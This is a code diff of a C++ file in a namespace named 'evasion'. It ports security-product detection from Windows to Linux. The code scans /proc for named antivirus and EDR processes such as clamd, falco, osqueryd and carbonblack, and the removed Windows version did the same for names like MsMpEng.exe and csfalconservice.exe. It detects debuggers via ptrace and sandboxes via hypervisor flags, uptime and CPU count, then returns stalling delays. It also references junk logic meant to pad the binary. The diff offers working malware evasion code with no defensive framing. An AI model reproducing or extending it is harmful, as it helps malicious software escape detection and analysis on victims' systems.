@@ -1,103 +1,60 @@
 #include "Detection.h"
+#ifdef _WIN32
 #include <windows.h>
 #include <tlhelp32.h>
 #include <psapi.h>
+#else
+#include <unistd.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/sysinfo.h>
+#include <dirent.h>
+#include <fstream>
+#endif
 #include <algorithm>
 #include <random>
 #include <cwctype>
 #include "JunkLogic.h"
-
 namespace evasion {
-
 bool Detection::IsAVPresent() {
-    JunkLogic::GenerateEntropy();
-    std::vector<std::wstring> avProcesses = {
-        L"MsMpEng.exe", L"MpCmdRun.exe",
-        L"SavService.exe", L"SAVAdminService.exe",
-        L"CylanceSvc.exe", L"CylanceUI.exe"
-    };
-
-    for (const auto& av : avProcesses) {
-        if (IsProcessRunning(av)) return true;
-    }
+#ifdef LINUX
+    std::vector<std::string> av = {"clamd", "rkhunter", "chkrootkit", "sophosd"};
+    for (const auto& a : av) if (IsProcessRunning(a)) return true;
+#endif
     return false;
 }
-
 bool Detection::IsEDRPresent() {
-    JunkLogic::PerformComplexMath();
-    std::vector<std::wstring> edrProcesses = {
-        L"CbSvc.exe", L"CbDefense.exe",
-        L"csfalconservice.exe", L"SentinelAgent.exe",
-        L"elastic-endpoint.exe"
-    };
-
-    for (const auto& edr : edrProcesses) {
-        if (IsProcessRunning(edr)) return true;
-    }
+#ifdef LINUX
+    std::vector<std::string> edr = {"osqueryd", "auditd", "sysdig", "falco", "edr-agent", "carbonblack"};
+    for (const auto& e : edr) if (IsProcessRunning(e)) return true;
+#endif
     return false;
 }
-
 int Detection::GetJitterDelay() {
-    if (IsEDRPresent() || IsAVPresent()) {
-        std::random_device rd;
-        std::mt19937 gen(rd());
-        std::uniform_int_distribution<> dis(120, 480);
-        return dis(gen);
-    }
+#ifdef LINUX
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return 300;
+    std::ifstream cpu("/proc/cpuinfo"); std::string line;
+    while (std::getline(cpu, line)) if (line.find("hypervisor") != std::string::npos) return 420;
+    struct sysinfo si; if (sysinfo(&si) == 0 && si.uptime < 300) return 600;
+    if (sysconf(_SC_NPROCESSORS_ONLN) < 2) return 900;
+#endif
+    if (IsEDRPresent() || IsAVPresent()) { std::random_device rd; std::mt19937 gen(rd()); std::uniform_int_distribution<> dis(120, 480); return dis(gen); }
     return 0;
 }
-
-bool Detection::IsProcessRunning(const std::wstring& processName) {
-    bool found = false;
-
-    DWORD aProcesses[1024], cbNeeded, cProcesses;
-    unsigned int i;
-
-    // Use EnumProcesses from psapi
-    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
-        // Fallback to Toolhelp
-        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (hSnapshot != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32W pe;
-            pe.dwSize = sizeof(pe);
-            if (Process32FirstW(hSnapshot, &pe)) {
-                do {
-                    std::wstring currentProcess = pe.szExeFile;
-                    for (auto& c : currentProcess) c = (wchar_t)::towlower(c);
-                    std::wstring targetProcess = processName;
-                    for (auto& c : targetProcess) c = (wchar_t)::towlower(c);
-                    if (currentProcess == targetProcess) { found = true; break; }
-                } while (Process32NextW(hSnapshot, &pe));
-            }
-            CloseHandle(hSnapshot);
-        }
-        return found;
-    }
-
-    cProcesses = cbNeeded / sizeof(DWORD);
-    for (i = 0; i < cProcesses; i++) {
-        if (aProcesses[i] != 0) {
-            wchar_t szProcessName[MAX_PATH] = L"<unknown>";
-            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
-            if (NULL != hProcess) {
-                HMODULE hMod;
-                DWORD cbNeededMod;
-                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededMod)) {
-                    GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(wchar_t));
-                }
-                CloseHandle(hProcess);
-
-                std::wstring currentProcess = szProcessName;
-                for (auto& c : currentProcess) c = (wchar_t)::towlower(c);
-                std::wstring targetProcess = processName;
-                for (auto& c : targetProcess) c = (wchar_t)::towlower(c);
-
-                if (currentProcess == targetProcess) { found = true; break; }
+#ifdef LINUX
+bool Detection::IsProcessRunning(const std::string& name) {
+    DIR* dir = opendir("/proc"); if (!dir) return false;
+    struct dirent* entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_DIR) {
+            std::string pid = entry->d_name;
+            if (std::all_of(pid.begin(), pid.end(), ::isdigit)) {
+                std::ifstream cmd("/proc/" + pid + "/comm"); std::string comm;
+                if (std::getline(cmd, comm) && comm.find(name) != std::string::npos) { closedir(dir); return true; }
             }
         }
     }
-
-    return found;
+    closedir(dir); return false;
 }
-
-} // namespace evasion
+#endif
+}
